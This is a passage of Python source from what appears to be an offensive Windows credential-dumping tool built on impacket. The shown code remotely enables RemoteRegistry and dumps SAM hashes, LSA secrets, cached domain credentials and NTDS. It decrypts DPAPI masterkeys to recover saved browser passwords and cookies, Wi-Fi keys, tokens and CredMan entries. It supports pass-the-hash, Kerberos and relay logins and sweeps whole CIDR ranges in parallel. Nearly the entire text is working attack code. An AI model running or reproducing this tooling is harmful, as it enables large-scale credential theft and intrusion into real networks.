                                                           backend=default_backend())
                        enc   = bytes(reversed(dk['SecretData']))
                        plain = privkey.decrypt(enc, PKCS1v15())
                        if plain and len(plain) >= 8:
                            mk_sz = struct.unpack_from('<I', plain, 0)[0]
                            if 8 + mk_sz <= len(plain):
                                mk_bytes  = plain[8:8 + mk_sz]
                                guid_raw  = data[12:84]
                                guid      = guid_raw.decode('utf-16-le').rstrip('\x00').lower()
                                masterkeys[guid] = mk_bytes
                                decrypted += 1
                    except Exception:
                        pass
            if decrypted:
                out.append(f'[*] User MKs via backup key: {decrypted}')

        if files['user_mks'] and not sam_hashes and not bk_pem:
            sam_hashes = _fetch_sam_nt_hashes(host, auth, verbose)

        if sam_hashes and files['user_mks']:
            decrypted = 0
            for username, mkfs in files['user_mks'].items():
                nt_hex = sam_hashes.get(username.lower())
                if not nt_hex or nt_hex == EMPTY_NT:
                    continue
                nt_bytes = bytes.fromhex(nt_hex)
                sid = files['user_sids'].get(username, '')
                keys = _derive_user_keys(sid, nt_bytes) if sid else [nt_bytes]
                for mkf_path in mkfs:
                    try:
                        data = open(mkf_path, 'rb').read()
                        for key in keys:
                            guid, mk = _mk_decrypt_file(data, key)
                            if guid and mk and guid not in masterkeys:
                                masterkeys[guid] = mk
                                decrypted += 1
                                break
                    except Exception:
                        pass
            if decrypted:
                out.append(f'[*] User MKs via NT hash: {decrypted}')

        total_mk = len(masterkeys)
        out.append(f'[*] Total masterkeys available: {total_mk}')
        if total_mk == 0:
            out.append('[!] No masterkeys decrypted — browser passwords and CredMan will be encrypted')
            out.append('    Domain accounts: titan dump --backupkey -t <DC>  →  '
                       'titan dump --dpapi --dpapi-backupkey <pem> -t <target>')
            out.append('    Local accounts:  ensure SAM was dumped first (-A or --sam --dpapi)')
        elif not any(files['user_mks'].values()):
            pass
        else:
            # Diagnose Chrome key types before dumping — helps the user understand output
            all_browsers = [
                (files['chrome'], 'Chrome'),
                (files['edge'],   'Edge'),
                (files['brave'],  'Brave'),
            ]
            appb_count = dpapi_count = no_mk_count = 0
            for browser_files, _ in all_browsers:
                for info in browser_files.values():
                    _, kt = _chrome_aes_key(info.get('local_state'), masterkeys)
                    if kt == 'appb':        appb_count  += 1
                    elif kt == 'dpapi':     dpapi_count += 1
                    elif kt in ('dpapi_no_mk', 'appb_no_mk'): no_mk_count += 1
            if appb_count or dpapi_count or no_mk_count:
                out.append(f'[*] Browser key types: {dpapi_count} DPAPI-decrypted, '
                           f'{appb_count} APPB-decrypted (Chrome 127+), '
                           f'{no_mk_count} encrypted (masterkey unavailable)')

        _dump_browser_passwords(files['chrome'], masterkeys, 'Chrome', out)
        _dump_browser_passwords(files['edge'],   masterkeys, 'Edge',   out)
        _dump_browser_passwords(files['brave'],  masterkeys, 'Brave',  out)
        _dump_browser_cookies(files['chrome'],   masterkeys, 'Chrome', out)
        _dump_browser_cookies(files['edge'],     masterkeys, 'Edge',   out)
        _dump_browser_cookies(files['brave'],    masterkeys, 'Brave',  out)
        _dump_wifi_profiles(files['wifi_profiles'], masterkeys, out)
        _dump_wam_tokens(files['wam_tokens'],    masterkeys, out)
        _dump_rdcman(files['rdcman'],            masterkeys, out)
        _dump_sccm_naa(host, auth, masterkeys, out, verbose)
        _dump_task_scheduler(host, auth, workdir, out, verbose)
        _dump_credman(files['credman'], masterkeys, out)

    finally:
        shutil.rmtree(workdir, ignore_errors=True)

    out.append(f'\n[*] DPAPI dump complete: {host}')


# ── Remote Registry management ────────────────────────────────────────────────

def _smb_connect(host, args):
    """Create an impacket SMBConnection for RemoteRegistry management."""
    try:
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(host, host, None, 445, timeout=10)
        uname = args.username or ''
        if args.ntlm_hash:
            conn.login(uname, '', args.domain or '',
                       'aad3b435b51404eeaad3b435b51404ee', args.ntlm_hash)
        elif args.ticket_cache or args.tgt:
            os.environ['KRB5CCNAME'] = args.ticket_cache or args.tgt
            conn.kerberosLogin(uname, '', args.domain or '',
                               '', '', '', args.kdc or None, useCache=True)
        elif args.aes_key:
            conn.kerberosLogin(uname, '', args.domain or '',
                               '', '', args.aes_key, args.kdc or None)
        elif args.password:
            conn.login(uname, args.password, args.domain or '', '', '')
        else:
            conn.login(uname, '', args.domain or '', '', '')
        return conn
    except Exception:
        return None


class _RemoteRegistry:
    """Context manager: ensures RemoteRegistry is running, restores original state on exit."""

    _SVC = 'RemoteRegistry'

    def __init__(self, smb_conn, verbose=False):
        self._smb           = smb_conn
        self._verbose       = verbose
        self._scmr          = None
        self._scm_hdl       = None
        self._svc_hdl       = None
        self._should_stop   = False
        self._was_disabled  = False
        self._did_start     = False

    def __enter__(self):
        if self._smb is None:
            return self
        try:
            from impacket.dcerpc.v5 import transport, scmr
            import time

            rpc = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\svcctl]')
            rpc.set_smb_connection(self._smb)
            self._scmr = rpc.get_dce_rpc()
            self._scmr.connect()
            self._scmr.bind(scmr.MSRPC_UUID_SCMR)

            ans = scmr.hROpenSCManagerW(self._scmr)
            self._scm_hdl = ans['lpScHandle']
            ans = scmr.hROpenServiceW(self._scmr, self._scm_hdl, self._SVC)
            self._svc_hdl = ans['lpServiceHandle']

            ans   = scmr.hRQueryServiceStatus(self._scmr, self._svc_hdl)
            state = ans['lpServiceStatus']['dwCurrentState']

            if state == scmr.SERVICE_STOPPED:
                self._should_stop = True
                ans2 = scmr.hRQueryServiceConfigW(self._scmr, self._svc_hdl)
                if ans2['lpServiceConfig']['dwStartType'] == 0x4:
                    self._was_disabled = True
                    if self._verbose:
                        print('  [*] RemoteRegistry: disabled → enabling temporarily',
                              file=sys.stderr)
                    scmr.hRChangeServiceConfigW(self._scmr, self._svc_hdl, dwStartType=0x3)
                print('  [*] RemoteRegistry: stopped → starting', file=sys.stderr)
                scmr.hRStartServiceW(self._scmr, self._svc_hdl)
                self._did_start = True
                for _w in range(15):
                    time.sleep(1)
                    try:
                        _s = scmr.hRQueryServiceStatus(self._scmr, self._svc_hdl)
                        if _s['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
                            break
                    except Exception:
                        pass
            elif self._verbose:
                print('  [*] RemoteRegistry: already running', file=sys.stderr)
        except Exception as e:
            if self._verbose:
                print(f'  [!] RemoteRegistry enable failed: {e}', file=sys.stderr)
        return self

    def __exit__(self, *exc):
        if self._scmr is None:
            return
        try:
            from impacket.dcerpc.v5 import scmr
            if self._should_stop and self._did_start:
                print('  [*] RemoteRegistry: stopping (restoring original state)',
                      file=sys.stderr)
                try:
                    scmr.hRControlService(self._scmr, self._svc_hdl,
                                          scmr.SERVICE_CONTROL_STOP)
                except Exception as e:
                    if self._verbose:
                        print(f'  [!] RemoteRegistry stop skipped: {e}', file=sys.stderr)
            if self._was_disabled:
                if self._verbose:
                    print('  [*] RemoteRegistry: re-disabling', file=sys.stderr)
                scmr.hRChangeServiceConfigW(self._scmr, self._svc_hdl, dwStartType=0x4)
        except Exception as e:
            if self._verbose:
                print(f'  [!] RemoteRegistry restore failed: {e}', file=sys.stderr)
        finally:
            from impacket.dcerpc.v5 import scmr
            for hdl in (self._svc_hdl, self._scm_hdl):
                if hdl:
                    try:
                        scmr.hRCloseServiceHandle(self._scmr, hdl)
                    except Exception:
                        pass


# ── Per-host orchestration ────────────────────────────────────────────────────

def _check_host(host: str, auth: list, tcp_timeout: float = 3) -> str:
    """Returns 'ok', 'unreachable', or 'auth_failed'."""
    import socket
    try:
        with socket.create_connection((host, 445), timeout=tcp_timeout):
            pass
    except (OSError, socket.timeout):
        return 'unreachable'

    smb_timeout = max(5, int(tcp_timeout * 3))
    out, rc = _smb('ls', auth,
                   [rf'\\{host}\IPC$', '-Depth', '0', '-ConsoleOutputStyle', 'Json'],
                   False, smb_timeout)
    if rc != 0:
        return 'auth_failed'
    return 'ok'


def dump_host(host, args, auth):
    """Run all requested dump operations. Returns (sections_dict, nt_hashes_list)."""
    header = [f'\n{"=" * 60}', f'TARGET: {host}', f'{"=" * 60}']
    footer = [f'\n[*] Done: {host}']

    if getattr(args, 'no_pass', False) or getattr(args, 'kerberos', False):
        import socket as _sock
        try:
            with _sock.create_connection((host, 445), timeout=getattr(args, 'timeout', 3)):
                pass
        except (OSError, _sock.timeout):
            return 'unreachable', []
    else:
        status = _check_host(host, auth, tcp_timeout=getattr(args, 'timeout', 3))
        if status != 'ok':
            return status, []

    nt_hashes        = []
    sam_hashes       = {}
    dpapi_system_hex = None

    sec_sam       = []
    sec_lsa       = []
    sec_cache     = []
    sec_dpapi     = []
    sec_ntds      = []
    sec_backupkey = []

    if args.ntds:
        _dump_ntds(host, args, auth, sec_ntds, nt_hashes, verbose=args.verbose)
    else:
        need_syskey = args.sam or args.lsa or args.cache
        _smb_conn   = _smb_connect(host, args) if need_syskey else None
        _reg_auth_failed = False
        _reg_fail_rc     = 0
        # Relay mode: Titanis Reg normally uses RPC-over-TCP (port 135) which
        # ntlmrelayx SOCKS cannot relay. -PreferSmb forces named-pipe transport
        # so all connections stay on port 445.
        _smb_flags = ['-PreferSmb'] if getattr(args, 'no_pass', False) else []

        with _RemoteRegistry(_smb_conn, verbose=args.verbose):
            if need_syskey:
                if args.verbose:
                    print(f'[*] {host}: syskey', file=sys.stderr)
                sk_raw, sk_rc = _run(REG_BIN, 'syskey', auth,
                                     [host, '-BackupSemantics'] + _smb_flags,
                                     verbose=args.verbose)
                syskey_val = _syskey_from_output(sk_raw)
                if syskey_val == '(not retrieved)':
                    _reg_auth_failed = True
                    _reg_fail_rc     = sk_rc
                else:
                    syskey_line = f'[*] SYSKEY: {syskey_val}'
                    if args.sam:   sec_sam.append(syskey_line)
                    if args.lsa:   sec_lsa.append(syskey_line)
                    if args.cache: sec_cache.append(syskey_line)

            if not _reg_auth_failed:
                if args.sam:
                    if args.verbose:
                        print(f'[*] {host}: SAM hashes', file=sys.stderr)
                    sam_raw = _reg('dumpsam', auth, host,
                                   ['-BackupSemantics', '-ConsoleOutputStyle', 'Csv'] + _smb_flags,
                                   verbose=args.verbose)
                    sam_hashes = _dump_sam(host, sam_raw, sec_sam)

                nlkm_hex = None
                if args.lsa:
                    if args.verbose:
                        print(f'[*] {host}: LSA secrets', file=sys.stderr)
                    lsa_raw = _reg('dumplsasecrets', auth, host,
                                   ['-BackupSemantics', '-ConsoleOutputStyle', 'Csv'] + _smb_flags,
                                   verbose=args.verbose)
                    nlkm_hex, dpapi_system_hex = _dump_lsa(host, lsa_raw, auth, sec_lsa,
                                                            verbose=args.verbose)

                if args.cache:
                    if args.verbose:
                        print(f'[*] {host}: credential cache', file=sys.stderr)
                    cache_raw = _reg('list', auth, host,
                                     ['-BackupSemantics', r'HKLM\SECURITY\Cache',
                                      '-IncludeData', '-ConsoleOutputStyle', 'Csv'] + _smb_flags,
                                     verbose=args.verbose)
                    _dump_cache(host, cache_raw, nlkm_hex, sec_cache)

        if _smb_conn:
            try: _smb_conn.logoff()
            except Exception: pass

        if _reg_auth_failed:
            msg = (f'[!] {host} — authentication failed '
                   f'(Reg returned no output, rc={_reg_fail_rc})\n'
                   f'    Kerberos: ccache must have a cifs/ SPN — '
                   f'getST.py -spn cifs/{host} ...\n'
                   f'    Password/hash: verify credentials and network access')
            print(msg, file=sys.stderr)
            return 'auth_failed', []

    if getattr(args, 'dpapi', False):
        _dump_dpapi(host, args, auth, dpapi_system_hex, sam_hashes, sec_dpapi,
                    verbose=args.verbose)

    if getattr(args, 'backupkey', False):
        _dump_backupkey(host, args, auth, sec_backupkey)

    def _build(lines):
        if not lines:
            return ''
        return '\n'.join(header + lines + footer)

    all_lines = sec_ntds or (sec_sam + sec_lsa + sec_cache + sec_dpapi + sec_backupkey)
    sections = {
        'sam':       _build(sec_sam),
        'lsa':       _build(sec_lsa),
        'cache':     _build(sec_cache),
        'dpapi':     _build(sec_dpapi),
        'ntds':      _build(sec_ntds),
        'backupkey': _build(sec_backupkey),
        'all':       _build(all_lines),
    }
    return sections, nt_hashes


# ── Entry point ───────────────────────────────────────────────────────────────

def _process_host(host, args, auth, print_lock):
    with print_lock:
        print(f'[*] Processing {host} ...', file=sys.stderr, flush=True)

    result, nt_hashes = dump_host(host, args, auth)

    if isinstance(result, str):
        msgs = {'unreachable': f'[-] {host} — unreachable',
                'auth_failed': f'[-] {host} — authentication failed'}
        with print_lock:
            print(msgs.get(result, f'[-] {host} — {result}'), file=sys.stderr, flush=True)
        return

    sections = result
    safe = re.sub(r'[\\/:*?"<>|]', '_', host)

    if args.output_dir:
        section_map = {
            'sam':       f'{safe}_dump_sam.txt',
            'lsa':       f'{safe}_dump_lsa.txt',
            'cache':     f'{safe}_dump_cache.txt',
            'dpapi':     f'{safe}_dump_dpapi.txt',
            'ntds':      f'{safe}_dump_ntds.txt',
            'backupkey': f'{safe}_dump_backupkey.txt',
        }
        for key, fname in section_map.items():
            content = sections.get(key, '')
            if not content:
                continue
            path = os.path.join(args.output_dir, fname)
            with open(path, 'w') as fh:
                fh.write(content + '\n')
            with print_lock:
                print(f'[*] Saved → {path}', file=sys.stderr, flush=True)

        if nt_hashes:
            hp = os.path.join(args.output_dir, f'{safe}_dump_ntds_hashes.txt')
            with open(hp, 'w') as fh:
                fh.write('\n'.join(nt_hashes) + '\n')
            with print_lock:
                print(f'[*] Saved → {hp}  (NT hashes — hashcat -m 1000)',
                      file=sys.stderr, flush=True)

        written_sections = [k for k in section_map if sections.get(k)]
        if len(written_sections) > 1:
            all_content = sections.get('all', '')
            if all_content:
                all_path = os.path.join(args.output_dir, f'{safe}_dump_all.txt')
                with open(all_path, 'w') as fh:
                    fh.write(all_content + '\n')
                with print_lock:
                    print(f'[*] Saved → {all_path}', file=sys.stderr, flush=True)
    else:
        with print_lock:
            print(sections.get('all', ''), flush=True)


def _expand_hosts(raw):
    """Expand host strings — IPs, hostnames, CIDR ranges, dash ranges."""
    import ipaddress
    out = []
    for entry in raw:
        entry = entry.strip()
        if not entry or entry.startswith('#'):
            continue
        if '/' in entry:
            try:
                for ip in ipaddress.ip_network(entry, strict=False).hosts():
                    out.append(str(ip))
                continue
            except ValueError:
                pass
        if re.match(r'^\d+\.\d+\.\d+\.\d+-\d+$', entry):
            base, end = entry.rsplit('-', 1)
            parts = base.split('.')
            try:
                for i in range(int(parts[3]), int(end) + 1):
                    out.append(f'{parts[0]}.{parts[1]}.{parts[2]}.{i}')
                continue
            except (ValueError, IndexError):
                pass
        out.append(entry)
    return out


def main():
    args  = parse_args()
    auth  = _auth_args(args)

    raw   = ([args.target] if args.target else [h.strip() for h in args.file])
    hosts = _expand_hosts(raw)

    if args.output_dir:
        os.makedirs(args.output_dir, exist_ok=True)

    threads    = max(1, getattr(args, 'threads', 1))
    print_lock = __import__('threading').Lock()

    if threads == 1 or len(hosts) == 1:
        for host in hosts:
            _process_host(host, args, auth, print_lock)
    else:
        from concurrent.futures import ThreadPoolExecutor, as_completed
        if not args.output_dir:
            print('[!] -j/--threads requires -o/--output (results would be interleaved)',
                  file=sys.stderr)
            sys.exit(1)
        with ThreadPoolExecutor(max_workers=threads) as pool:
            futs = {pool.submit(_process_host, h, args, auth, print_lock): h
                    for h in hosts}
            for fut in as_completed(futs):
                try:
                    fut.result()
                except Exception as e:
                    with print_lock:
                        print(f'[!] {futs[fut]}: {e}', file=sys.stderr, flush=True)


if __name__ == '__main__':
    main()
